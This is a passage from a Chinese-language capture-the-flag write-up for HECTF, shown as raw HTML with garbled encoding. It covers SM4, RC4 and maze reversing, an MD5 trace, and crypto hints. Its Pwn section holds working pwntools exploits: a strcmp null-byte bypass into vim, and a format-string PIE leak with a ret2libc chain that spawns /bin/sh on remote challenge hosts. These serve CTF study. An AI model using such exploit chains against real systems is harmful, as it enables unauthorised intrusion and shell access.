class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            box_in = text_[<span class="number">1</span>] ^ text_[<span class="number">2</span>] ^ text_[<span class="number">3</span>] ^ key_r[i]</span><br><span class="line">            box_out = self._s_box(box_in)</span><br><span class="line">            temp = text_[<span class="number">0</span>] ^ box_out ^ self._rot_left(box_out, <span class="number">2</span>) ^ self._rot_left(box_out, <span class="number">10</span>)</span><br><span class="line">            temp = temp ^ self._rot_left(box_out, <span class="number">18</span>) ^ self._rot_left(box_out, <span class="number">24</span>)</span><br><span class="line">            text_ = text_[<span class="number">1</span>:] + [temp]</span><br><span class="line">        text_ = text_[::-<span class="number">1</span>]  <span class="comment"># ç»“æœé€†åº</span></span><br><span class="line">        <span class="comment"># å°† 4x32bit åˆå¹¶æˆ 128bit</span></span><br><span class="line">        result = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            result.extend(text_[i].to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_generate_key</span>(<span class="params">self, key: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;å¯†é’¥ç”Ÿæˆ&quot;&quot;&quot;</span></span><br><span class="line">        key_r, key_temp = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)], [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        FK = [<span class="number">0xa3b1bac6</span>, <span class="number">0x56aa3350</span>, <span class="number">0x677d9197</span>, <span class="number">0xb27022dc</span>]</span><br><span class="line">        CK = [<span class="number">0x00070e15</span>, <span class="number">0x1c232a31</span>, <span class="number">0x383f464d</span>, <span class="number">0x545b6269</span>, <span class="number">0x70777e85</span>, <span class="number">0x8c939aa1</span>, <span class="number">0xa8afb6bd</span>, <span class="number">0xc4cbd2d9</span>,</span><br><span class="line">              <span class="number">0xe0e7eef5</span>, <span class="number">0xfc030a11</span>, <span class="number">0x181f262d</span>, <span class="number">0x343b4249</span>, <span class="number">0x50575e65</span>, <span class="number">0x6c737a81</span>, <span class="number">0x888f969d</span>, <span class="number">0xa4abb2b9</span>,</span><br><span class="line">              <span class="number">0xc0c7ced5</span>, <span class="number">0xdce3eaf1</span>, <span class="number">0xf8ff060d</span>, <span class="number">0x141b2229</span>, <span class="number">0x30373e45</span>, <span class="number">0x4c535a61</span>, <span class="number">0x686f767d</span>, <span class="number">0x848b9299</span>,</span><br><span class="line">              <span class="number">0xa0a7aeb5</span>, <span class="number">0xbcc3cad1</span>, <span class="number">0xd8dfe6ed</span>, <span class="number">0xf4fb0209</span>, <span class="number">0x10171e25</span>, <span class="number">0x2c333a41</span>, <span class="number">0x484f565d</span>, <span class="number">0x646b7279</span>]</span><br><span class="line">        <span class="comment"># å°† 128bit æ‹†åˆ†æˆ 4x32bit</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            temp = <span class="built_in">int</span>.from_bytes(key[<span class="number">4</span> * i:<span class="number">4</span> * i + <span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            key_temp[i] = temp ^ FK[i]</span><br><span class="line">        <span class="comment"># å¾ªç¯ç”Ÿæˆè½®å¯†é’¥</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            box_in = key_temp[<span class="number">1</span>] ^ key_temp[<span class="number">2</span>] ^ key_temp[<span class="number">3</span>] ^ CK[i]</span><br><span class="line">            box_out = self._s_box(box_in)</span><br><span class="line">            key_r[i] = key_temp[<span class="number">0</span>] ^ box_out ^ self._rot_left(box_out, <span class="number">13</span>) ^ self._rot_left(box_out, <span class="number">23</span>)</span><br><span class="line">            key_temp = key_temp[<span class="number">1</span>:] + [key_r[i]]</span><br><span class="line">        <span class="keyword">return</span> key_r</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_s_box</span>(<span class="params">n: <span class="built_in">int</span></span>):</span><br><span class="line">        BOX = [<span class="number">0xD6</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>, <span class="number">0x2B</span>,</span><br><span class="line">               <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>, <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span>, <span class="number">0x9C</span>, <span class="number">0x42</span>,</span><br><span class="line">               <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0xE4</span>, <span class="number">0xB3</span>, <span class="number">0x1C</span>,</span><br><span class="line">               <span class="number">0xA9</span>, <span class="number">0xC9</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>, <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>, <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>,</span><br><span class="line">               <span class="number">0xF3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0x4F</span>, <span class="number">0xA8</span>, <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>,</span><br><span class="line">               <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>, <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>, <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x5E</span>, <span class="number">0x63</span>, <span class="number">0x58</span>,</span><br><span class="line">               <span class="number">0xD1</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9F</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>,</span><br><span class="line">               <span class="number">0x52</span>, <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>, <span class="number">0xEA</span>, <span class="number">0xBF</span>, <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>,</span><br><span class="line">               <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>, <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>, <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>, <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>,</span><br><span class="line">               <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>, <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>,</span><br><span class="line">               <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>,</span><br><span class="line">               <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, <span class="number">0x5B</span>, <span class="number">0x51</span>, <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>, <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>,</span><br><span class="line">               <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>, <span class="number">0x0A</span>, <span class="number">0xC1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>, <span class="number">0xB8</span>,</span><br><span class="line">               <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>,</span><br><span class="line">               <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>, <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>,</span><br><span class="line">               <span class="number">0x48</span>]</span><br><span class="line">        result = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="comment"># å°† 32bit æ‹†åˆ†æˆ 4x8bitï¼Œä¾æ¬¡è¿›è¡ŒSç›’å˜æ¢</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">list</span>(n.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>)):</span><br><span class="line">            result.append(BOX[item])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(result, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_rot_left</span>(<span class="params">n, m</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;å¾ªç¯å·¦ç§»&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> ((n &lt;&lt; m) | (n &gt;&gt; (<span class="number">32</span> - m))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;AD763B4FCDCFD9251089FB0408A45F80&quot;</span>)  <span class="comment"># 128bitå¯†é’¥</span></span><br><span class="line">sm4 = SM4Cipher(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ¨è°ƒæµ‹è¯•åŠ å¯†</span></span><br><span class="line"><span class="comment"># plaintext = bytes.fromhex(&quot;0123456789abcdeffedcba9876543210&quot;)  # 128bitæ˜æ–‡</span></span><br><span class="line"><span class="comment"># print(sm4.encrypt(plaintext).hex())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£å¯†</span></span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;D75CDA22176DD392A1A570915F66A61C&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(sm4.decrypt(c).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6f2069d8ab245446d789590d2cfe20d6</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="authorâ€™sB0x"><a href="#authorâ€™sB0x" class="headerlink" title="authorâ€™sB0x"></a>authorâ€™sB0x</h3><blockquote><p>still ez</p></blockquote><p>è¯†åˆ«ä»£ç é€»è¾‘ä¸ºRC4ç®—æ³•ï¼Œkeyä¸º <code>thiskey</code>ï¼Œæå–å¯†æ–‡hexä¸º <code>C3F5E5E2EC17E52ACA03B6FDC1BC704410CDA6130B9A73060E4DDE95129CD946</code>ï¼Œ</p><p>Cyberchefè§£å‡ºflagï¼š<code>HECTF&#123;Th3CutW0rmF0rgiv3sTh3Pl0w&#125;</code></p><p>â€‹    </p><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><p>åˆ†æä»£ç é€»è¾‘ï¼Œä¸º8å±‚8*8è¿·å®«ï¼Œå…¶ä¸­0ä¸ºå¯èµ°æ–¹å—ï¼Œ1ä¸ºä¸å¯èµ°æ–¹å—ï¼Œwsadä¸ºä¸Šä¸‹å·¦å³ï¼Œuä¸ºä¸‹ä¸€å±‚ï¼Œnä¸ºä¸Šä¸€å±‚ã€‚</p><p>å°†8å±‚01è¿·å®«çŸ©é˜µæ‰“å°å‡ºæ¥ï¼Œä»ç¬¬ä¸€å±‚ (0,0) æ‰‹åŠ¨æ¨¡æ‹Ÿèµ°è¿·å®«ï¼Œå¾—åˆ°è·¯å¾„ <code>ssddssuuwwddndduuussdussasauudd</code>ï¼ŒåŠ ä¸ŠHECTF{}å³ä¸ºflagã€‚</p><p>â€‹    </p><h3 id="è¿˜åŸmd5"><a href="#è¿˜åŸmd5" class="headerlink" title="è¿˜åŸmd5"></a>è¿˜åŸmd5</h3><blockquote><p>MD5(flag) = 55a573c5ff5ae053ee7f165c6e972613  å“ˆå“ˆå“ˆï¼Œé€†å»å§</p><p>HINTS:</p><p>æ³¨æ„ï¼Œreé¢˜ç›®md5çš„flagæäº¤æ—¶ä¸éœ€è¦å†å¥—HECTF{}</p></blockquote><p>txtå†…å®¹åƒæ˜¯è°ƒç”¨libsfdata.soè®¡ç®—md5è¿‡ç¨‹æ±‡ç¼–æ“ä½œè®°å½•ï¼Œæ—¢ç„¶æ˜¯å…¨è¿‡ç¨‹ï¼Œè‚¯å®šæœ‰è¯»å…¥åŸå§‹æ•°æ®ï¼Œä»¥16è¿›åˆ¶å­˜å…¥å¯„å­˜å™¨æˆ–å†…å­˜çš„ç—•è¿¹ï¼ŒHECTçš„hexå€¼â€48454354â€œï¼Œæ³¨æ„æ˜¯å°ç«¯åºï¼Œå…¨å±€æœç´¢ <code>54434548</code>ï¼Œæ‰¾åˆ° <code>r6=0x54434548</code> ç–‘ä¼¼è¯»å…¥å¯„å­˜å™¨æ“ä½œï¼Œç»§ç»­å…¨å±€æœç´¢ <code>=&gt; r6=0x</code>ï¼Œæœ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Line 44619: [23:49:43 081][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x0 =&gt; r6=0x54434548</span><br><span class="line">Line 44624: [23:49:43 081][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x4 =&gt; r6=0x444d5f46</span><br><span class="line">Line 44629: [23:49:43 082][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x8 =&gt; r6=0x31332b32</span><br><span class="line">Line 44634: [23:49:43 083][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0xc =&gt; r6=0x39363636</span><br><span class="line">Line 44639: [23:49:43 083][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x10 =&gt; r6=0x37313237</span><br><span class="line">Line 44644: [23:49:43 084][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x14 =&gt; r6=0x34393338</span><br><span class="line">Line 44649: [23:49:43 085][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x18 =&gt; r6=0x43753059</span><br><span class="line">Line 44654: [23:49:43 085][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x1c =&gt; r6=0x6f646e61</span><br><span class="line">Line 44659: [23:49:43 086][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x20 =&gt; r6=0x743f7431</span><br><span class="line">Line 44664: [23:49:43 087][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x24 =&gt; r6=0x4b233964</span><br><span class="line">Line 44669: [23:49:43 087][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x28 =&gt; r6=0x37705f6e</span><br><span class="line">Line 44674: [23:49:43 088][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x2c =&gt; r6=0x80775576</span><br></pre></td></tr></table></figure><p>æå–å‡ºr6çš„å€¼hexè½¬å­—ç¬¦å³ä¸ºflagï¼š<code>HECTF_MD2+31666972178394Y0uCando1t?td9#Kn_p7vUw</code></p><p>â€‹    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>å…ˆåˆ©ç”¨ <code>\x00</code> æˆªæ–­ç»•è¿‡ <code>strcmp</code> æ¯”è¾ƒï¼Œè¿›å…¥ <code>system(&#39;vim -R&#39;)</code> çš„vimäº¤äº’æ¨¡å¼ï¼Œå†ä½¿ç”¨vimå‘½ä»¤ <code>:e æ–‡ä»¶å</code> è¯»å–flagå†…å®¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;121.4.111.50&#x27;</span>,<span class="number">32365</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&#x27;x&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;:e flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç”±äºè¿›å…¥vimå‘½ä»¤ä¼šæ¸…ç©ºç»ˆç«¯å†…å®¹ï¼Œåœ¨pwntoolsäº¤äº’ä¸‹è¯»å–çš„å†…å®¹ä¼šè¢«ç¬é—´åˆ·æ‰ï¼Œå¯ä»¥å°†è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶ï¼Œè·å–åˆ°flagå†…å®¹è¾“å‡ºï¼š</p><p><code>python test.py &gt; output.txt</code></p><p>â€‹    </p><h3 id="çœŸÂ·ç­¾åˆ°"><a href="#çœŸÂ·ç­¾åˆ°" class="headerlink" title="çœŸÂ·ç­¾åˆ°"></a>çœŸÂ·ç­¾åˆ°</h3><blockquote><p>å¬è¯´ä½ è¿˜æ²¡ç­¾ä¸Šåˆ°</p></blockquote><p>intç±»å‹å¼ºåˆ¶è½¬æ¢ä¸ºcharï¼Œå½“å€¼ä¸º128~255æ—¶å˜æˆè´Ÿæ•°ï¼Œæ¨¡æ‹Ÿä¼ªä»£ç ï¼Œåœ¨æœ€å¤§å€¼2147483647é™„è¿‘å°è¯•å¯»æ‰¾æ‰€éœ€æ•°å­—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> x = <span class="number">2147483646</span><span class="number">-124</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, x);</span><br><span class="line"><span class="type">int</span> y = x;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">char</span>)y);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">char</span>)y&lt;<span class="number">-125</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, y&gt;<span class="number">255</span>);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2147483522æ»¡è¶³æ¡ä»¶ï¼Œä¼ å…¥ågetshellæ‹¿åˆ°flagã€‚</p><p>â€‹    </p><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p>ç¨‹åºå¼€äº†PIEï¼ŒgdbåŠ¨è°ƒï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²å½“å‰å‡½æ•°åœ°å€ï¼Œå†å‡å»åç§»å¾—åˆ°ç¨‹åºåŸºå€ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†ç®€å•ret2libcå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;121.4.102.43&#x27;</span>,<span class="number">31550</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/root/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r,&#x27;b *$rebase(0x123a)&#x27;)</span></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">b&#x27;%15$p&#x27;</span>)</span><br><span class="line">pie_base = <span class="built_in">eval</span>(r.recv(<span class="number">14</span>))-<span class="number">0x123a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie_base))</span><br><span class="line"></span><br><span class="line">pop_rdi = pie_base+<span class="number">0x1333</span></span><br><span class="line">pop_rsi_r15 = pie_base+<span class="number">0x1331</span></span><br><span class="line">ret = pie_base+<span class="number">0x101a</span></span><br><span class="line">puts_got = pie_base+elf.got.puts</span><br><span class="line">puts_plt = pie_base+elf.plt.puts</span><br><span class="line">get = pie_base+<span class="number">0x12ab</span></span><br><span class="line"></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(get)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr-libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base+libc.sym.system</span><br><span class="line">binsh = libc_base+libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(binsh)+p64(pop_rsi_r15)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(system)+p64(get)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pl))</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="æµåŠ¨çš„éŸ³ç¬¦"><a href="#æµåŠ¨çš„éŸ³ç¬¦" class="headerlink" title="æµåŠ¨çš„éŸ³ç¬¦"></a>æµåŠ¨çš„éŸ³ç¬¦</h3><p>txtå†…ä¸ºéŸ³ç¬¦åŠ å¯†ï¼Œä½¿ç”¨<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">åœ¨çº¿è§£å¯†å·¥å…·</a>è§£å¯†å¾—åˆ°flagã€‚</p><p>â€‹    </p><h3 id="matrix"><a href="#matrix" class="headerlink" title="matrix"></a>matrix</h3><p>å‡ºé¢˜å¤±è¯¯ï¼Œæºç æ³„éœ²æ‹¿åˆ°flagã€‚</p><p>â€‹    </p><h3 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 